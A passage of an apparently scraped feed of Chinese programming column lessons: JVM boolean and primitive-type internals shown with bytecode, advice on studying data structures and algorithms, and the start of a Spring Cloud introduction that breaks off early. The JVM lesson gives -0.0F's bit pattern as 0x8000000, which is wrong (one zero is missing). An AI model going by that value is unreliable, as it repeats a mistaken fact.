&lt;p>当然，直接编译这段代码，编译器是会报错的。所以，我迂回了一下，采用一个 Java 字节码的汇编工具，直接对字节码进行更改。&lt;/p>
&lt;p>那么问题就来了：当一个 boolean 变量的值是 2 时，它究竟是 true 还是 false 呢？&lt;/p>
&lt;p>如果你跑过这段代码，你会发现，问虚拟机&amp;quot;吃过饭没&amp;quot;，它会回答&amp;quot;吃了&amp;quot;，而问虚拟机&amp;quot;真（==）吃过饭没&amp;quot;，虚拟机则不会回答&amp;quot;真吃了&amp;quot;。&lt;/p>
&lt;p>那么虚拟机到底吃过没，下面我们来一起分析一下这背后的细节。&lt;/p>
&lt;h2 id="java-虚拟机的-boolean-类型">Java 虚拟机的 boolean 类型&lt;/h2>
&lt;p>首先，我们来看看 Java 语言规范以及 Java 虚拟机规范是怎么定义 boolean 类型的。&lt;/p>
&lt;p>在 Java 语言规范中，boolean 类型的值只有两种可能，它们分别用符号&amp;quot;true&amp;quot;和&amp;quot;false&amp;quot;来表示。显然，这两个符号是不能被虚拟机直接使用的。&lt;/p>
&lt;p>在 Java 虚拟机规范中，boolean 类型则被映射成 int 类型。具体来说，&amp;ldquo;true&amp;quot;被映射为整数 1，而&amp;quot;false&amp;quot;被映射为整数 0。这个编码规则约束了 Java 字节码的具体实现。&lt;/p>
&lt;p>举个例子，对于存储 boolean 数组的字节码，Java 虚拟机需保证实际存入的值是整数 1 或者 0。&lt;/p>
&lt;p>Java 虚拟机规范同时也要求 Java 编译器遵守这个编码规则，并且用整数相关的字节码来实现逻辑运算，以及基于 boolean 类型的条件跳转。这样一来，在编译而成的 class 文件中，除了字段和传入参数外，基本看不出 boolean 类型的痕迹了。&lt;/p>
&lt;pre>&lt;code># Foo.main 编译后的字节码
0: iconst_2 // 我们用 AsmTools 更改了这一指令
1: istore_1
2: iload_1
3: ifeq 14 // 第一个 if 语句，即操作数栈上数值为 0 时跳转
6: getstatic java.lang.System.out
9: ldc &amp;quot; 吃了 &amp;quot;
11: invokevirtual java.io.PrintStream.println
14: iload_1
15: iconst_1
16: if_icmpne 27 // 第二个 if 语句，即操作数栈上两个数值不相同时跳转
19: getstatic java.lang.System.out
22: ldc &amp;quot; 真吃了 &amp;quot;
24: invokevirtual java.io.PrintStream.println
27: return
&lt;/code>&lt;/pre>
&lt;p>在前面的例子中，第一个 if 语句会被编译成条件跳转字节码 ifeq，翻译成人话就是说，如果局部变量&amp;quot;吃过饭没&amp;quot;的值为 0，那么跳过打印&amp;quot;吃了&amp;quot;的语句。&lt;/p>
&lt;p>而第二个 if 语句则会被编译成条件跳转字节码 if_icmpne，也就是说，如果局部变量的值和整数 1 不相等，那么跳过打印&amp;quot;真吃了&amp;quot;的语句。&lt;/p>
&lt;p>可以看到，Java 编译器的确遵守了相同的编码规则。当然，这个约束很容易绕开。除了我们小作业中用到的汇编工具 AsmTools 外，还有许多可以修改字节码的 Java 库，比如说 ASM &lt;a href="https://asm.ow2.io/">[1]&lt;/a>等。&lt;/p>
&lt;p>对于 Java 虚拟机来说，它看到的 boolean 类型，早已被映射为整数类型。因此，将原本声明为 boolean 类型的局部变量，赋值为除了 0、1 之外的整数值，在 Java 虚拟机看来是&amp;quot;合法&amp;quot;的。&lt;/p>
&lt;p>在我们的例子中，经过编译器编译之后，Java 虚拟机看到的不是在问&amp;quot;吃过饭没&amp;rdquo;，而是在问&amp;quot;吃过几碗饭&amp;quot;。也就是说，第一个 if 语句变成：你不会一碗饭都没吃吧。第二个 if 语句则变成：你吃过一碗饭了吗。&lt;/p>
&lt;p>如果我们约定俗成，每人每顿只吃一碗，那么第二个 if 语句还是有意义的。但如果我们打破常规，吃了两碗，那么较真的 Java 虚拟机就会将第二个 if 语句判定为假了。&lt;/p>
&lt;h2 id="java-的基本类型">Java 的基本类型&lt;/h2>
&lt;p>除了上面提到的 boolean 类型外，Java 的基本类型还包括整数类型 byte、short、char、int 和 long，以及浮点类型 float 和 double。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/77/45/77dfb788a8ad5877e77fc28ed2d51745.png" alt="">&lt;/p>
&lt;p>Java 的基本类型都有对应的值域和默认值。可以看到，byte、short、int、long、float 以及 double 的值域依次扩大，而且前面的值域被后面的值域所包含。因此，从前面的基本类型转换至后面的基本类型，无需强制转换。另外一点值得注意的是，尽管他们的默认值看起来不一样，但在内存中都是 0。&lt;/p>
&lt;p>在这些基本类型中，boolean 和 char 是唯二的无符号类型。在不考虑违反规范的情况下，boolean 类型的取值范围是 0 或者 1。char 类型的取值范围则是 [0, 65535]。通常我们可以认定 char 类型的值为非负数。这种特性十分有用，比如说作为数组索引等。&lt;/p>
&lt;p>在前面的例子中，我们能够将整数 2 存储到一个声明为 boolean 类型的局部变量中。那么，声明为 byte、char 以及 short 的局部变量，是否也能够存储超出它们取值范围的数值呢？&lt;/p>
&lt;p>答案是可以的。而且，这些超出取值范围的数值同样会带来一些麻烦。比如说，声明为 char 类型的局部变量实际上有可能为负数。当然，在正常使用 Java 编译器的情况下，生成的字节码会遵守 Java 虚拟机规范对编译器的约束，因此你无须过分担心局部变量会超出它们的取值范围。&lt;/p>
&lt;p>Java 的浮点类型采用 IEEE 754 浮点数格式。以 float 为例，浮点类型通常有两个 0，+0.0F 以及 -0.0F。&lt;/p>
&lt;p>前者在 Java 里是 0，后者是符号位为 1、其他位均为 0 的浮点数，在内存中等同于十六进制整数 0x8000000（即 -0.0F 可通过 Float.intBitsToFloat(0x8000000) 求得）。尽管它们的内存数值不同，但是在 Java 中 +0.0F == -0.0F 会返回真。&lt;/p>
&lt;p>在有了 +0.0F 和 -0.0F 这两个定义后，我们便可以定义浮点数中的正无穷及负无穷。正无穷就是任意正浮点数（不包括 +0.0F）除以 +0.0F 得到的值，而负无穷是任意正浮点数除以 -0.0F 得到的值。在 Java 中，正无穷和负无穷是有确切的值，在内存中分别等同于十六进制整数 0x7F800000 和 0xFF800000。&lt;/p>
&lt;p>你也许会好奇，既然整数 0x7F800000 等同于正无穷，那么 0x7F800001 又对应什么浮点数呢？&lt;/p>
&lt;p>这个数字对应的浮点数是 NaN（Not-a-Number）。&lt;/p>
&lt;p>不仅如此，[0x7F800001, 0x7FFFFFFF] 和 [0xFF800001, 0xFFFFFFFF] 对应的都是 NaN。当然，一般我们计算得出的 NaN，比如说通过 +0.0F/+0.0F，在内存中应为 0x7FC00000。这个数值，我们称之为标准的 NaN，而其他的我们称之为不标准的 NaN。&lt;/p>
&lt;p>NaN 有一个有趣的特性：除了&amp;quot;!=&amp;ldquo;始终返回 true 之外，所有其他比较结果都会返回 false。&lt;/p>
&lt;p>举例来说，&amp;ldquo;NaN&amp;lt;1.0F&amp;quot;返回 false，而&amp;quot;NaN&amp;gt;=1.0F&amp;quot;同样返回 false。对于任意浮点数 f，不管它是 0 还是 NaN，&amp;ldquo;f!=NaN&amp;quot;始终会返回 true，而&amp;quot;f==NaN&amp;quot;始终会返回 false。&lt;/p>
&lt;p>因此，我们在程序里做浮点数比较的时候，需要考虑上述特性。在本专栏的第二部分，我会介绍这个特性给向量化比较带来什么麻烦。&lt;/p>
&lt;h2 id="java-基本类型的大小">Java 基本类型的大小&lt;/h2>
&lt;p>在第一篇中我曾经提到，Java 虚拟机每调用一个 Java 方法，便会创建一个栈帧。为了方便理解，这里我只讨论供解释器使用的解释栈帧（interpreted frame）。&lt;/p>
&lt;p>这种栈帧有两个主要的组成部分，分别是局部变量区，以及字节码的操作数栈。这里的局部变量是广义的，除了普遍意义下的局部变量之外，它还包含实例方法的&amp;quot;this 指针&amp;quot;以及方法所接收的参数。&lt;/p>
&lt;p>在 Java 虚拟机规范中，局部变量区等价于一个数组，并且可以用正整数来索引。除了 long、double 值需要用两个数组单元来存储之外，其他基本类型以及引用类型的值均占用一个数组单元。&lt;/p>
&lt;p>也就是说，boolean、byte、char、short 这四种类型，在栈上占用的空间和 int 是一样的，和引用类型也是一样的。因此，在 32 位的 HotSpot 中，这些类型在栈上将占用 4 个字节；而在 64 位的 HotSpot 中，他们将占 8 个字节。&lt;/p>
&lt;p>当然，这种情况仅存在于局部变量，而并不会出现在存储于堆中的字段或者数组元素上。对于 byte、char 以及 short 这三种类型的字段或者数组单元，它们在堆上占用的空间分别为一字节、两字节，以及两字节，也就是说，跟这些类型的值域相吻合。&lt;/p>
&lt;p>因此，当我们将一个 int 类型的值，存储到这些类型的字段或数组时，相当于做了一次隐式的掩码操作。举例来说，当我们把 0xFFFFFFFF（-1）存储到一个声明为 char 类型的字段里时，由于该字段仅占两字节，所以高两位的字节便会被截取掉，最终存入&amp;rdquo;\uFFFF&amp;rdquo;。&lt;/p>
&lt;p>boolean 字段和 boolean 数组则比较特殊。在 HotSpot 中，boolean 字段占用一字节，而 boolean 数组则直接用 byte 数组来实现。为了保证堆中的 boolean 值是合法的，HotSpot 在存储时显式地进行掩码操作，也就是说，只取最后一位的值存入 boolean 字段或数组中。&lt;/p>
&lt;p>讲完了存储，现在我来讲讲加载。Java 虚拟机的算数运算几乎全部依赖于操作数栈。也就是说，我们需要将堆中的 boolean、byte、char 以及 short 加载到操作数栈上，而后将栈上的值当成 int 类型来运算。&lt;/p>
&lt;p>对于 boolean、char 这两个无符号类型来说，加载伴随着零扩展。举个例子，char 的大小为两个字节。在加载时 char 的值会被复制到 int 类型的低二字节，而高二字节则会用 0 来填充。&lt;/p>
&lt;p>对于 byte、short 这两个类型来说，加载伴随着符号扩展。举个例子，short 的大小为两个字节。在加载时 short 的值同样会被复制到 int 类型的低二字节。如果该 short 值为非负数，即最高位为 0，那么该 int 类型的值的高二字节会用 0 来填充，否则用 1 来填充。&lt;/p>
&lt;h2 id="总结与实践">总结与实践&lt;/h2>
&lt;p>今天我介绍了 Java 里的基本类型。&lt;/p>
&lt;p>其中，boolean 类型在 Java 虚拟机中被映射为整数类型：&amp;ldquo;true&amp;quot;被映射为 1，而&amp;quot;false&amp;quot;被映射为 0。Java 代码中的逻辑运算以及条件跳转，都是用整数相关的字节码来实现的。&lt;/p>
&lt;p>除 boolean 类型之外，Java 还有另外 7 个基本类型。它们拥有不同的值域，但默认值在内存中均为 0。这些基本类型之中，浮点类型比较特殊。基于它的运算或比较，需要考虑 +0.0F、-0.0F 以及 NaN 的情况。&lt;/p>
&lt;p>除 long 和 double 外，其他基本类型与引用类型在解释执行的方法栈帧中占用的大小是一致的，但它们在堆中占用的大小确不同。在将 boolean、byte、char 以及 short 的值存入字段或者数组单元时，Java 虚拟机会进行掩码操作。在读取时，Java 虚拟机则会将其扩展为 int 类型。&lt;/p>
&lt;p>今天的动手环节，你可以观测一下，将 boolean 类型的值存入字段中时，Java 虚拟机所做的掩码操作。&lt;/p>
&lt;p>你可以将下面代码中 boolValue = true 里的 true 换为 2 或者 3，看看打印结果与你的猜测是否相符合。&lt;/p>
&lt;p>熟悉 Unsafe 的同学，可以使用 Unsafe.putBoolean 和 Unsafe.putByte 方法，看看还会不会做掩码操作。&lt;/p>
&lt;pre>&lt;code>public class Foo {
static boolean boolValue;
public static void main(String[] args) {
boolValue = true; // 将这个 true 替换为 2 或者 3，再看看打印结果
if (boolValue) System.out.println(&amp;quot;Hello, Java!&amp;quot;);
if (boolValue == true) System.out.println(&amp;quot;Hello, JVM!&amp;quot;);
}
}
&lt;/code>&lt;/pre>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/2a/d5/2a62e58cbdf56a5dc40748567d346fd5.jpg" alt="">&lt;/p></description></item><item><title>极客专栏: 02丨如何抓住重点，系统高效地学习数据结构与算法？</title><link>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E4%B9%8B%E7%BE%8E/02%E4%B8%A8%E5%A6%82%E4%BD%95%E6%8A%93%E4%BD%8F%E9%87%8D%E7%82%B9%E7%B3%BB%E7%BB%9F%E9%AB%98%E6%95%88%E5%9C%B0%E5%AD%A6%E4%B9%A0%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/</link><pubDate>Fri, 27 May 2022 00:00:00 +0000</pubDate><guid>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E4%B9%8B%E7%BE%8E/02%E4%B8%A8%E5%A6%82%E4%BD%95%E6%8A%93%E4%BD%8F%E9%87%8D%E7%82%B9%E7%B3%BB%E7%BB%9F%E9%AB%98%E6%95%88%E5%9C%B0%E5%AD%A6%E4%B9%A0%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/</guid><description>
&lt;p>你是否曾跟我一样，因为看不懂数据结构和算法，而一度怀疑是自己太笨？实际上，很多人在第一次接触这门课时，都会有这种感觉，觉得数据结构和算法很抽象，晦涩难懂，宛如天书。正是这个原因，让很多初学者对这门课望而却步。&lt;/p>
&lt;p>我个人觉得，其实真正的原因是你&lt;strong>没有找到好的学习方法&lt;/strong> ，&lt;strong>没有抓住学习的重点&lt;/strong>。实际上，数据结构和算法的东西并不多，常用的、基础的知识点更是屈指可数。只要掌握了正确的学习方法，学起来并没有看上去那么难，更不需要什么高智商、厚底子。&lt;/p>
&lt;p>还记得大学里每次考前老师都要划重点吗？今天，我就给你划划我们这门课的重点，再告诉你一些我总结的学习小窍门。相信有了这些之后，你学起来就会有的放矢、事半功倍了。&lt;/p>
&lt;h2 id="什么是数据结构什么是算法">什么是数据结构？什么是算法？&lt;/h2>
&lt;p>大部分数据结构和算法教材，在开篇都会给这两个概念下一个明确的定义。但是，这些定义都很抽象，对理解这两个概念并没有实质性的帮助，反倒会让你陷入死抠定义的误区。毕竟，我们现在学习，并不是为了考试，所以，概念背得再牢，不会用也就没什么用。&lt;/p>
&lt;p>&lt;strong>虽然我们说没必要深挖严格的定义，但是这并不等于不需要理解概念。&lt;/strong> 下面我就从广义和狭义两个层面，来帮你理解数据结构与算法这两个概念。&lt;/p>
&lt;p>从广义上讲，数据结构就是指一组数据的存储结构。算法就是操作数据的一组方法。&lt;/p>
&lt;p>图书馆储藏书籍你肯定见过吧？为了方便查找，图书管理员一般会将书籍分门别类进行&amp;quot;存储&amp;quot;。按照一定规律编号，就是书籍这种&amp;quot;数据&amp;quot;的存储结构。&lt;/p>
&lt;p>那我们如何来查找一本书呢？有很多种办法，你当然可以一本一本地找，也可以先根据书籍类别的编号，是人文，还是科学、计算机，来定位书架，然后再依次查找。笼统地说，这些查找方法都是算法。&lt;/p>
&lt;p>从狭义上讲，也就是我们专栏要讲的，是指某些著名的数据结构和算法，比如队列、栈、堆、二分查找、动态规划等。这些都是前人智慧的结晶，我们可以直接拿来用。我们要讲的这些经典数据结构和算法，都是前人从很多实际操作场景中抽象出来的，经过非常多的求证和检验，可以高效地帮助我们解决很多实际的开发问题。&lt;/p>
&lt;p>那数据结构和算法有什么关系呢？为什么大部分书都把这两个东西放到一块儿来讲呢？&lt;/p>
&lt;p>这是因为，数据结构和算法是相辅相成的。&lt;strong>数据结构是为算法服务的，算法要作用在特定的数据结构之上。&lt;/strong> 因此，我们无法孤立数据结构来讲算法，也无法孤立算法来讲数据结构。&lt;/p>
&lt;p>比如，因为数组具有随机访问的特点，常用的二分查找算法需要用数组来存储数据。但如果我们选择链表这种数据结构，二分查找算法就无法工作了，因为链表并不支持随机访问。&lt;/p>
&lt;p>数据结构是静态的，它只是组织数据的一种方式。如果不在它的基础上操作、构建算法，孤立存在的数据结构就是没用的。&lt;/p>
&lt;p>现在你对数据结构与算法是不是有了比较清晰的理解了呢？有了这些储备，下面我们来看看，究竟该怎么学数据结构与算法。&lt;/p>
&lt;h2 id="学习这个专栏需要什么基础">学习这个专栏需要什么基础？&lt;/h2>
&lt;p>看到数据结构和算法里的&amp;quot;算法&amp;quot;两个字，很多人就会联想到&amp;quot;数学&amp;quot;，觉得算法会涉及到很多深奥的数学知识。那我数学基础不是很好，学起来会不会很吃力啊？&lt;/p>
&lt;p>数据结构和算法课程确实会涉及一些数学方面的推理、证明，尤其是在分析某个算法的时间、空间复杂度的时候，但是这个你完全不需要担心。&lt;/p>
&lt;p>这个专栏不会像《算法导论》那样，里面有非常复杂的数学证明和推理。我会由浅入深，从概念到应用，一点一点给你解释清楚。你只要有高中数学水平，就完全可以学习。&lt;/p>
&lt;p>当然，我希望你最好有些编程基础，如果有项目经验就更好了。这样我给你讲数据结构和算法如何提高效率、如何节省存储空间，你就会有很直观的感受。因为，对于每个概念和实现过程，我都会从实际场景出发，不仅教你&amp;quot;&lt;strong>是什么&lt;/strong> &amp;ldquo;，还会教你&amp;rdquo;&lt;strong>为什么&lt;/strong> &amp;ldquo;，并且告诉你遇到同类型问题应该&amp;rdquo;&lt;strong>怎么做&lt;/strong>&amp;quot;。&lt;/p>
&lt;h2 id="学习的重点在什么地方">学习的重点在什么地方？&lt;/h2>
&lt;p>提到数据结构和算法，很多人就很头疼，因为这里面的内容实在是太多了。这里，我就帮你梳理一下，应该先学什么，后学什么。你可以对照看看，你属于哪个阶段，然后有针对地进行学习。&lt;/p>
&lt;p>想要学习数据结构与算法，&lt;strong>首先要掌握一个数据结构与算法中最重要的概念&amp;mdash;&amp;mdash;复杂度分析。&lt;/strong>&lt;/p>
&lt;p>这个概念究竟有多重要呢？可以这么说，它几乎占了数据结构和算法这门课的半壁江山，是数据结构和算法学习的精髓。&lt;/p>
&lt;p>数据结构和算法解决的是如何更省、更快地存储和处理数据的问题，因此，我们就需要一个考量效率和资源消耗的方法，这就是复杂度分析方法。所以，如果你只掌握了数据结构和算法的特点、用法，但是没有学会复杂度分析，那就相当于只知道操作口诀，而没掌握心法。只有把心法了然于胸，才能做到无招胜有招！&lt;/p>
&lt;p>所以，复杂度分析这个内容，我会用很大篇幅给你讲透。你也一定要花大力气来啃，必须要拿下，并且要搞得非常熟练。否则，后面的数据结构和算法也很难学好。&lt;/p>
&lt;p>搞定复杂度分析，下面就要进入&lt;strong>数据结构与算法的正文内容&lt;/strong>了。&lt;/p>
&lt;p>为了让你对数据结构和算法能有个全面的认识，我画了一张图，里面几乎涵盖了所有数据结构和算法书籍中都会讲到的知识点。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/91/a7/913e0ababe43a2d57267df5c5f0832a7.jpg" alt="">&lt;br>
（图谱内容较多，建议长按保存后浏览）&lt;/p>
&lt;p>但是，作为初学者，或者一个非算法工程师来说，你并不需要掌握图里面的所有知识点。很多高级的数据结构与算法，比如二分图、最大流等，这些在我们平常的开发中很少会用到。所以，你暂时可以不用看。我还是那句话，咱们学习要学会找重点。如果不分重点地学习，眉毛胡子一把抓，学起来肯定会比较吃力。&lt;/p>
&lt;p>所以，结合我自己的学习心得，还有这些年的面试、开发经验，我总结了&lt;strong>20 个最常用的、最基础&lt;/strong> 数据结构与算法，&lt;strong>不管是应付面试还是工作需要，只要集中精力逐一攻克这 20 个知识点就足够了。&lt;/strong>&lt;/p>
&lt;p>这里面有 10 个数据结构：数组、链表、栈、队列、散列表、二叉树、堆、跳表、图、Trie 树；10 个算法：递归、排序、二分查找、搜索、哈希算法、贪心算法、分治算法、回溯算法、动态规划、字符串匹配算法。&lt;/p>
&lt;p>掌握了这些基础的数据结构和算法，再学更加复杂的数据结构和算法，就会非常容易、非常快。&lt;/p>
&lt;p>在学习数据结构和算法的过程中，你也要注意，不要只是死记硬背，不要为了学习而学习，而是&lt;strong>要学习它的&amp;quot;来历&amp;quot;&amp;ldquo;自身的特点&amp;quot;&amp;ldquo;适合解决的问题&amp;quot;以及&amp;quot;实际的应用场景&amp;rdquo;&lt;/strong>。对于每一种数据结构或算法，我都会从这几个方面进行详细讲解。只要你掌握了我每节课里讲的内容，就能在开发中灵活应用。&lt;/p>
&lt;p>学习数据结构和算法的过程，是非常好的思维训练的过程，所以，千万不要被动地记忆，要多辩证地思考，多问为什么。如果你一直这么坚持做，你会发现，等你学完之后，写代码的时候就会不由自主地考虑到很多性能方面的事情，时间复杂度、空间复杂度非常高的垃圾代码出现的次数就会越来越少。你的编程内功就真正得到了修炼。&lt;/p>
&lt;h2 id="一些可以让你事半功倍的学习技巧">一些可以让你事半功倍的学习技巧&lt;/h2>
&lt;p>前面我给你划了学习的重点，也讲了学习这门课需要具备的基础。作为一个过来人，现在我就给你分享一下，专栏学习的一些技巧。掌握了这些技巧，可以让你化被动为主动，学起来更加轻松，更加有动力！&lt;/p>
&lt;h3 id="1-边学边练适度刷题">1. 边学边练，适度刷题&lt;/h3>
&lt;p>&amp;ldquo;边学边练&amp;quot;这一招非常有用。建议你每周花 1～2 个小时的时间，集中把这周的三节内容涉及的数据结构和算法，全都自己写出来，用代码实现一遍。这样一定会比单纯地看或者听的效果要好很多！&lt;/p>
&lt;p>有面试需求的同学，可能会问了，那我还要不要去刷题呢？&lt;/p>
&lt;p>我个人的观点是&lt;strong>可以&amp;quot;适度&amp;quot;刷题，但一定不要浪费太多时间在刷题上&lt;/strong> 。我们&lt;strong>学习的目的还是掌握，然后应用&lt;/strong>。除非你要面试 Google、Facebook 这样的公司，它们的算法题目非常非常难，必须大量刷题，才能在短期内提升应试正确率。如果是应对国内公司的技术面试，即便是 BAT 这样的公司，你只要彻底掌握这个专栏的内容，就足以应对。&lt;/p>
&lt;h3 id="2-多问多思考多互动">2. 多问、多思考、多互动&lt;/h3>
&lt;p>&lt;strong>学习最好的方法是，找到几个人一起学习，一块儿讨论切磋，有问题及时寻求老师答疑。&lt;/strong> 但是，离开大学之后，既没有同学也没有老师，这个条件就比较难具备了。&lt;/p>
&lt;p>不过，这也就是咱们专栏学习的优势。专栏里有很多跟你一样的学习者。你可以多在留言区写下自己的疑问、思考和总结，也可以经常看看别人的留言，和他们进行互动。&lt;/p>
&lt;p>除此之外，如果你有疑问，你可以随时在留言区给我留言，我只要有空就会及时回复你。你不要担心问的问题太小白。因为我初学的时候，也常常会被一些小白问题困扰。不懂一点都不丢人，只要你勇敢提出来，我们一起解决了就可以了。&lt;/p>
&lt;p>我也会力争每节课都最大限度地给你讲透，帮你扫除知识盲点，而你要做的就是，避免一知半解，要想尽一切办法去搞懂我讲的所有内容。&lt;/p>
&lt;h3 id="3-打怪升级学习法">3. 打怪升级学习法&lt;/h3>
&lt;p>&lt;strong>学习的过程中，我们碰到最大的问题就是，坚持不下来。&lt;/strong> 是的，很多基础课程学起来都非常枯燥。为此，我自己总结了一套&amp;quot;打怪升级学习法&amp;rdquo;。&lt;/p>
&lt;p>游戏你肯定玩过吧？为什么很多看起来非常简单又没有乐趣的游戏，你会玩得不亦乐乎呢？这是因为，当你努力打到一定级别之后，每天看着自己的经验值、战斗力在慢慢提高，那种每天都在一点一点成长的成就感就不由自主地产生了。&lt;/p>
&lt;p>所以，&lt;strong>我们在枯燥的学习过程中，也可以给自己设立一个切实可行的目标&lt;/strong>，就像打怪升级一样。&lt;/p>
&lt;p>比如，针对这个专栏，你就可以设立这样一个目标：每节课后的思考题都认真思考，并且回复到留言区。当你看到很多人给你点赞之后，你就会为了每次都能发一个漂亮的留言，而更加认真地学习。&lt;/p>
&lt;p>当然，还有很多其他的目标，比如，每节课后都写一篇学习笔记或者学习心得；或者你还可以每节课都找一下我讲得不对、不合理的地方&amp;hellip;&amp;hellip;诸如此类，你可以总结一个适合你的&amp;quot;打怪升级攻略&amp;rdquo;。&lt;/p>
&lt;p>如果你能这样学习一段时间，不仅能收获到知识，你还会有意想不到的成就感。因为，这其实帮你改掉了一点学习的坏习惯。这个习惯一旦改掉了，你的人生也会变得不一样。&lt;/p>
&lt;h3 id="4-知识需要沉淀不要想试图一下子掌握所有">4. 知识需要沉淀，不要想试图一下子掌握所有&lt;/h3>
&lt;p>在学习的过程中，一定会碰到&amp;quot;拦路虎&amp;quot;。如果哪个知识点没有怎么学懂，不要着急，这是正常的。因为，想听一遍、看一遍就把所有知识掌握，这肯定是不可能的。&lt;strong>学习&lt;strong>&lt;strong>知识的&lt;/strong>&lt;/strong>过程是反复迭代、不断沉淀的过程。&lt;/strong>&lt;/p>
&lt;p>如果碰到&amp;quot;拦路虎&amp;quot;，你可以尽情地在留言区问我，也可以先沉淀一下，过几天再重新学一遍。所谓，书读百遍其义自见，我觉得是很有道理的！&lt;/p>
&lt;p>我讲的这些学习方法，不仅仅针对咱们这一个课程的学习，其实完全适用任何知识的学习过程。你可以通过这个专栏的学习，实践一下这些方法。如果效果不错，再推广到之后的学习过程中。&lt;/p>
&lt;h2 id="内容小结">内容小结&lt;/h2>
&lt;p>今天，我带你划了划数据结构和算法的学习重点，复杂度分析，以及 10 个数据结构和 10 个算法。&lt;/p>
&lt;p>这些内容是我根据平时的学习和工作、面试经验积累，精心筛选出来的。只要掌握这些内容，应付日常的面试、工作，基本不会有问题。&lt;/p>
&lt;p>除此之外，我还给你分享了我总结的一些学习技巧，比如边学边练、多问、多思考，还有两个比较通用的学习方法，打怪升级法和沉淀法。掌握了这些学习技巧，可以让你学习过程中事半功倍。所以，你一定要好好实践哦！&lt;/p>
&lt;h2 id="课后思考">课后思考&lt;/h2>
&lt;p>今天的内容是一个准备课，从下节开始，我们就要正式开始学习精心筛选出的这 20 个数据结构和算法了。所以，今天给你布置一个任务，对照我上面讲的&amp;quot;打怪升级学习法&amp;quot;，请思考一下你自己学习这个专栏的方法，让我们一起在留言区立下 Flag，相互鼓励！&lt;/p>
&lt;p>另外，你在之前学习数据结构和算法的过程中，遇到过什么样的困难或者疑惑吗？&lt;/p>
&lt;p>欢迎留言和我分享，我会第一时间给你反馈。&lt;/p>
&lt;p>&lt;img src="https://static001.geekbang.org/resource/image/8e/d3/8e603e3d795fc0ab2698f6f5eabf14d3.jpg" alt="">&lt;/p></description></item><item><title>极客专栏: 02丨微服务全家桶：走进SpringCloud的世界</title><link>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/springclouod%E5%BE%AE%E6%9C%8D%E5%8A%A1%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%98/02%E4%B8%A8%E5%BE%AE%E6%9C%8D%E5%8A%A1%E5%85%A8%E5%AE%B6%E6%A1%B6%E8%B5%B0%E8%BF%9Bspringcloud%E7%9A%84%E4%B8%96%E7%95%8C/</link><pubDate>Fri, 27 May 2022 00:00:00 +0000</pubDate><guid>/%E6%9E%81%E5%AE%A2%E4%B8%93%E6%A0%8F/springclouod%E5%BE%AE%E6%9C%8D%E5%8A%A1%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%98/02%E4%B8%A8%E5%BE%AE%E6%9C%8D%E5%8A%A1%E5%85%A8%E5%AE%B6%E6%A1%B6%E8%B5%B0%E8%BF%9Bspringcloud%E7%9A%84%E4%B8%96%E7%95%8C/</guid><description>
&lt;p>你好，我是姚秋辰。&lt;/p>
&lt;p>上一节课，我向你介绍了微服务架构的特点和优势。今天我就来带你了解 Spring Cloud 框架，看一看被称为微服务全家桶的 Spring Cloud 提供了哪些强大的工具。&lt;/p>
&lt;p>通过今天的学习，你将会了解 Spring Cloud 框架的功能定位，以及它和 Spring Boot 之间的关系。除此之外，我还会详细讲解 Spring Cloud 的发展历史，并介绍 Netflix 和 Alibaba 两大核心组件库，以及 Spring Cloud 的版本更新策略。这样一来，你就对 Spring Cloud 框架有了一个全面的认识。&lt;/p>
&lt;p>那我首先来带你了解一下什么是 Spring Cloud。&lt;/p>
&lt;h1 id="大话-spring-cloud">大话 Spring Cloud&lt;/h1>
&lt;p>Spring Cloud 可谓出身名门，它由 Spring 开源社区主导孵化的，专门为了解决微服务架构难题而诞生的一款微&amp;quot;微服务全家桶&amp;quot;框架。难能可贵的是，Spring Cloud 走了一条博采众家之长的道路，除了 Spring 开源社区的研发力量以外，它还吸纳了很多业界一线互联网大厂的开源组件为己用，将这些经过大厂真实业务锤炼的组件孵化成为了 Spring Cloud 组件的一部分。&lt;/p>
&lt;p>我们通过 Spring 社区发布的一张简化的架构图来看一下 Spring Cloud 的技能加点。&lt;br>
&lt;img src="https://static001.geekbang.org/resource/image/50/36/50dc50b943a1d68e1b9682f573e51736.jpg?wh=2000x1194" alt="">&lt;br>
Spring社区发布的一张简化的架构图&lt;/p>
&lt;p>在上面这幅图中，我们可以看到有几个 Spring Boot Apps 的应用集群，这就是经过拆分后的微服务。Spring Cloud 和 Spring Boot 达成了一种默契的配合：Spring Boot 主内，通过自动装配和各种开箱即用的特性，搞定了数据层访问、RESTful 接口、日志组件、内置容器等等基础功能，让开发人员不费吹灰之力就可以搭建起一个应用；Spring Cloud 主外，在应用集群之外提供了各种分布式系统的支持特性，帮助你轻松实现负载均衡、熔断降级、配置管理等诸多微服务领域的功能。&lt;/p>
&lt;p>从 Spring Boot 和 Spring Cloud 的分工中我们可以看出，Spring Boot 忙活的是底层的柴米油盐酱醋茶，Spring Boot 后勤保障做得好，才能让 Spring Cloud 毫无顾虑地投身于微服务的星辰大海，两者合二为一完整构建了微服务领域的全家桶解决方案。&lt;/p>
&lt;p>到这里，相信你已经可以理解 Spring Boot 和 Spring Cloud 的侧重点，以及 Spring Cloud 的功能定位。那么接下来，让我带你去了解一下 Spring Cloud 内部都有哪些重要组件。&lt;/p>
&lt;h1 id="spring-cloud-组件库的朝代更替">Spring Cloud 组件库的朝代更替&lt;/h1>
&lt;p>在我们开始了解 Spring Cloud 组件库之前，我得先介绍在 Spring Cloud 历史上举足轻重的两家公司 Netflix 和 Alibaba，以及它们的恩怨情仇。这两家公司分别为开源社区贡献了 Spring Cloud Netflix 组件库和 Spring Cloud Alibaba 组件库。&lt;/p>
